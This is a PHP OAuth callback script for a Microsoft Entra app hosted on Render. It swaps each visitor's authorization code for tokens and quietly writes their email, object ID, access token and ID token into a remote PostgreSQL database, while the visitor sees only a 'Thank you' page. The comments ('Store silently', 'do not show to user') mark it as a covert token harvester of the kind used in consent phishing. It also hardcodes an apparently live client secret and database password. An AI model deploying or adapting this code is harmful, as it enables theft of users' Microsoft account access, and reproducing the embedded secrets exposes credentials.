<?php
// --- CONFIG ---
$client_id = '6dff28e9-1e23-4b52-ad14-b1f2b4ed3525';
$client_secret = 'de38Q~901_U0wQBpNYt5hhoNNJqBUs4CehuQFaiM';
$redirect_uri = 'https://render-php-oauth.onrender.com/callback.php';
$token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

// --- DB (Render PostgreSQL) ---
$db_host = 'dpg-d5vv58soud1c738tk8sg-a.virginia-postgres.render.com';
$db_name = 'oauth_db_xiqr';
$db_user = 'oauth_db_xiqr_user';
$db_pass = 'm9MGFrvs6EbuxQACEDh9HWy43KCaKlsV';

// --- START ---
if (!isset($_GET['code'])) {
    echo 'Thank you.';
    exit;
}

$code = $_GET['code'];

// Exchange code for token
$postData = http_build_query([
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri,
    'scope' => 'openid profile email User.Read'
]);

$context = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $postData
    ]
]);

$response = @file_get_contents($token_url, false, $context);
if ($response === false) {
    echo 'Thank you.';
    exit;
}

$token = json_decode($response, true);

// Decode ID token (user info)
$payload = json_decode(
    base64_decode(strtr(explode('.', $token['id_token'])[1], '-_', '+/')),
    true
);

$oid   = $payload['oid'] ?? null;
$email = $payload['preferred_username'] ?? null;

// Store silently in PostgreSQL
try {
    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $pdo->prepare("INSERT INTO oauth_users (oid, email, access_token, id_token) VALUES (?, ?, ?, ?)");
    $stmt->execute([$oid, $email, $token['access_token'], $token['id_token']]);
} catch (PDOException $e) {
    // silently fail, do not show to user
}

// User sees only this
echo "<h2>Thank you! You may now close this page.</h2>";
